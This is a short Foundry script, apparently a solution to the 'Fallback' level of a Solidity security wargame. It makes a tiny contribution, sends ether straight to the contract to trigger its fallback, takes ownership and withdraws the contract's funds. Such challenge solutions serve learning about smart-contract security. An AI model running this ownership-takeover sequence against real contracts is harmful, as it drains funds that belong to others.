// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/Ilevel01.sol";

contract POC is Script {
    Fallback level1 = Fallback(0xFEa5EC80853C53c7083F9027BE97130F3836D460);

    function run() external {
        vm.startBroadcast();

        level1.contribute{value: 1 wei}();
        level1.getContribution();
        address(level1).call{value: 1 wei}("");
        level1.owner();
        level1.withdraw();
        
        vm.stopBroadcast();
    }
}